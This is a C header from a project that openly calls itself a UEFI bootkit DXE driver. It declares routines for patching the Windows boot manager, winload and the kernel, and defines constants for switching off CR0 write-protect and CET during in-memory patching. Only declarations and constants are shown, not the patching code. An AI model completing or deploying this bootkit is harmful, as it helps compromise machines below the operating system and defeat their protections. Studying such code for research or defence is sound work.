/*
 * ============================================================
 *  Project  : WhiteLotus — UEFI Bootkit DXE Driver
 *  File     : WhiteLotus.h
 * ============================================================
 *
 *  Description:
 *    Central project header. Aggregates all UEFI/EDK2 library
 *    includes, CPU control register constant definitions
 *    (CR0.WP, CR4.CET, MSR_EFER, EFER_LMA, EFER_UAIE), and
 *    shared type/function declarations used across every
 *    module of the DXE driver.
 *
 *  Purpose:
 *    - Provide a single include point for all driver modules.
 *    - Define CPU register macros required for write-protect
 *      and CET manipulation during in-memory patching.
 *
 *  Author   : 0xbekoo
 *  Blog     : https://0xbekoo.github.io
 *  Updated  : 2026-05-21
 *
 * ============================================================
 */

#include <Uefi.h>
#include <Library/UefiLib.h>
#include <Library/UefiDriverEntryPoint.h>
#include <Library/UefiBootServicesTableLib.h>
#include <Library/UefiRuntimeLib.h>
#include <Library/UefiRuntimeServicesTableLib.h>
#include <Library/DebugLib.h>
#include <Library/MemoryAllocationLib.h>
#include <Library/BaseMemoryLib.h>
#include <Library/PrintLib.h>
#include <Library/DevicePathLib.h>

#include <Protocol/SimpleFileSystem.h>
#include <Protocol/LoadedImage.h>

#include <Guid/FileInfo.h>

#include <IndustryStandard/PeImage.h>

#include "PE.h"
#include "Ntdef.h"
#include "Arch.h"
#include "Intern.h"

#define CR0_WP			((UINTN)0x00010000) // CR0.WP
#define CR0_PG			((UINTN)0x80000000) // CR0.PG
#define CR4_CET			((UINTN)0x00800000) // CR4.CET
#define CR4_LA57		((UINTN)0x00001000) // CR4.LA57
#define MSR_EFER		((UINTN)0xC0000080) // Extended Function Enable Register
#define EFER_LMA		((UINTN)0x00000400) // Long Mode Active
#define EFER_UAIE		((UINTN)0x00100000) // Upper Address Ignore Enabled

extern EFI_HANDLE gBootmgfwHandle;

EFI_STATUS EFIAPI PatchBootMgfw(INPUT_FILETYPE FileType, CONST VOID* ImageBase, UINTN ImageSize);

typedef
NTSTATUS
(EFIAPI*
t_BlStatusPrint)(
	IN CONST CHAR16 *Format,
	...
	);
t_BlStatusPrint gBlStatusPrint = NULL;

EFI_STATUS
EFIAPI
FindPattern(
   CONST UINT8* Pattern,
	IN UINT8 Wildcard,
	IN UINT32 PatternLength,
	IN CONST VOID* Base,
	IN UINT32 Size,
	OUT VOID **Found
	);

VOID*
EFIAPI
CopyWpMem(
	OUT VOID *Destination,
	IN CONST VOID *Source,
	IN UINTN Length
	);

EFI_STATUS EFIAPI PatchWinload(CONST VOID* ImageBase, PEFI_IMAGE_NT_HEADERS NtHeaders);

INTN
EFIAPI
StrniCmp(
	IN CONST CHAR16 *FirstString,
	IN CONST CHAR16 *SecondString,
	IN UINTN Length
	);

typedef struct _KERNEL_PATCH_INFORMATION
{
	EFI_STATUS Status;
	UINTN BufferSize;
	CHAR16 Buffer[8192];
  UINT32 WinloadBuildNumber;
  UINT32 KernelBuildNumber;
  VOID* KernelBase;
} KERNEL_PATCH_INFORMATION;
